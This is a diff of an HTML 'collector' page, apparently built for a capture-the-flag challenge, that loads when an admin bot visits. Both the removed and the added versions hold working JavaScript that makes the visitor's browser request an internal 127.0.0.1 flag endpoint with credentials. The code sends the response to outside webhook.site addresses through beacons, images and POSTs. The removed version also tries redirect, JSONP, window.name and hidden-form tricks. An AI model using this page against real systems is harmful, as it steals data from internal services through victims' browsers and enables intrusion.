@@ -1,132 +1,54 @@
 <!doctype html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>collector</title>
+  <meta charset="utf-8">
+  <title>exploit</title>
 </head>
 <body>
-<h2>collector — aggressive exfil page</h2>
-<p>Watching for exfil to webhook</p>
-<script>
-(async function(){
-  // webhook you control
-  const WH = "https://webhook.site/6cd5ca68-6f38-4b62-ac03-db4442d880d6";
+  <h2>collector page</h2>
+  <p>Waiting for admin visit…</p>
 
-  // internal target we want the admin to hit
-  const internal = "http://127.0.0.1:5000/api/fetchflag";
-
-  // Small helper: create an image pointing at a URL (blind GET)
-  function imgGet(url){ try { const i = new Image(); i.src = url + (url.includes('?')? '&' : '?') + 'r=' + Math.random(); } catch(e){} }
-
-  // 1) Blind GET via <img>
-  imgGet(internal + "?via=img");
-
-  // 2) Script tag (if internal returns JS or JSONP)
-  try {
-    const s = document.createElement('script');
-    s.src = internal + "?via=script";
-    document.body.appendChild(s);
-  } catch(e){}
-
-  // 3) Hidden iframe to cause the request in the browser
-  try {
-    const f = document.createElement('iframe');
-    f.style.display = 'none';
-    f.src = internal;
-    document.body.appendChild(f);
-  } catch(e){}
-
-  // 4) no-cors fetch to fire the request (opaque) - then signal to webhook that we fired it
-  try {
-    fetch(internal, { mode: 'no-cors', credentials: 'include' }).then(() => {
-      imgGet(WH + "?note=fired_no_cors");
-    }).catch(()=>{ imgGet(WH + "?note=no_cors_err"); });
-  } catch(e){ imgGet(WH + "?note=no_cors_exc"); }
-
-  // 5) Try CORS fetch (may fail to read) but try to exfiltrate what we can
-  try {
-    fetch(internal, { mode: 'cors', credentials: 'include' }).then(r => r.text()).then(text => {
-      // Attempt to send what we read to webhook via multiple channels
-      navigator.sendBeacon(WH + "?flag=" + encodeURIComponent(text));
-      imgGet(WH + "?flag=" + encodeURIComponent(text));
-      // fallback POST (may be blocked by CORS but try)
-      fetch(WH, { method: 'POST', body: text }).catch(()=>{});
-    }).catch(()=>{ imgGet(WH + "?note=cors_failed"); });
-  } catch(e){ imgGet(WH + "?note=cors_exc"); }
-
-  // 6) Try common redirect/reflection parameter names pointing to your webhook
-  const redirectGuesses = [
-    "/?next=",
-    "/?redirect=",
-    "/?url=",
-    "/redirect?url=",
-    "/login?next=",
-    "/logout?next=",
-    "/callback?next=",
-    "/returnTo="
-  ];
-  for (const g of redirectGuesses) {
-    imgGet("http://127.0.0.1:5000" + g + encodeURIComponent(WH + "?via=redir"));
-  }
-
-  // 7) Try JSONP-like param names (callback) — if internal supports JSONP it may call our global cb
-  window.__collect_callback = function(payload){
+  <script>
+  (async function(){
     try {
-      navigator.sendBeacon(WH + "?flag=" + encodeURIComponent(JSON.stringify(payload)));
-      imgGet(WH + "?flag=" + encodeURIComponent(JSON.stringify(payload)));
-    } catch(e){}
-  };
-  try {
-    const cbScript = document.createElement('script');
-    cbScript.src = internal + "?callback=__collect_callback";
-    document.body.appendChild(cbScript);
-  } catch(e){}
+      // adjust target if you know a different internal host/port
+      const target = "http://127.0.0.1:5000/api/fetchflag";
+      const WH = "https://webhook.site/6cd5ca68-6f38-4b62-ac03-db4442d880d6";
 
-  // 8) Attempt window.name transport (rarely works unless server sets window.name)
-  try {
-    const transportIframe = document.createElement('iframe');
-    transportIframe.style.display = 'none';
-    // load the internal page first
-    transportIframe.src = internal + "?via=wn";
-    document.body.appendChild(transportIframe);
-
-    // after a short delay, navigate iframe to a same-origin page we control (the GitHub page)
-    setTimeout(() => {
+      // Try to fetch and read the body (works if same-origin or CORS allowed)
+      let text = null;
       try {
-        transportIframe.src = window.location.origin + "/wn_collect.html";
-        // after it loads, read transportIframe.contentWindow.name (if internal page set it)
-        setTimeout(() => {
-          try {
-            const val = transportIframe.contentWindow && transportIframe.contentWindow.name;
-            if (val) {
-              imgGet(WH + "?flag=" + encodeURIComponent(val));
-            }
-          } catch(e){
-            imgGet(WH + "?note=wn_read_err");
-          }
-        }, 2000);
-      } catch(e){
-        imgGet(WH + "?note=wn_nav_err");
+        const r = await fetch(target, { credentials: 'include' });
+        if (r && r.ok) {
+          try { text = await r.text(); } catch(e){ text = null; }
+        }
+      } catch(e) { /* ignore, fallback below */ }
+
+      // If body not readable, at least fire a no-cors request so the admin issues the request
+      if (!text) {
+        try { await fetch(target, { mode: 'no-cors', credentials: 'include' }); } catch(e){ /* ignore */ }
       }
-    }, 2000);
-  } catch(e){ imgGet(WH + "?note=wn_exc"); }
 
-  // 9) Fallback: attempt to POST a form to internal (some endpoints accept form input)
-  try {
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = "http://127.0.0.1:5000/visit"; // example writable endpoint
-    form.style.display = 'none';
-    const i1 = document.createElement('input'); i1.name='url'; i1.value='http://example.invalid';
-    const i2 = document.createElement('input'); i2.name='visitor'; i2.value='botpage';
-    form.appendChild(i1); form.appendChild(i2);
-    document.body.appendChild(form);
-    form.submit();
-  } catch(e){}
-
-  // Final signal we loaded
-  imgGet(WH + "?note=page_loaded");
-})();
-</script>
+      // Exfiltrate if we have the body; otherwise signal that the request fired
+      if (text) {
+        // safe base64 for Unicode
+        const b64 = btoa(unescape(encodeURIComponent(text)));
+        const url = WH + "?flag=" + encodeURIComponent(b64);
+        if (navigator.sendBeacon) {
+          try { navigator.sendBeacon(url); }
+          catch(e) { new Image().src = url; }
+        } else {
+          new Image().src = url;
+        }
+      } else {
+        // notify that the internal fetch was attempted but body not available
+        new Image().src = WH + "?note=fired_no_body&r=" + Math.random();
+      }
+    } catch (err) {
+      // best-effort error reporting
+      try { new Image().src = "https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?err=" + encodeURIComponent(err + ""); } catch(_) {}
+    }
+  })();
+  </script>
 </body>
 </html>
